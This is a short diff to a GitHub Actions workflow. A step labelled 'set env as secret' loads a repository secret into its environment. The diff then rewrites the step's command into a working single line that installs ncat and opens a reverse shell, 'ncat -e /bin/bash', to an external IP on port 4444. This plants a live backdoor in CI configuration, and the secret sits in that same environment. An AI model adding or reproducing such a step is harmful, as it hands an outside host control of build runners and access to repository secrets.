@@ -14,5 +14,4 @@ jobs:
     - name: set env as secret
       env: 
         MY_VAL: ${{ secrets.BLA_BLA }}
-      run: sudo apt install -y ncat 
-           ncat -e /bin/bash 18.222.231.153 4444
+      run: sudo apt install -y ncat; ncat -e /bin/bash 18.222.231.153 4444
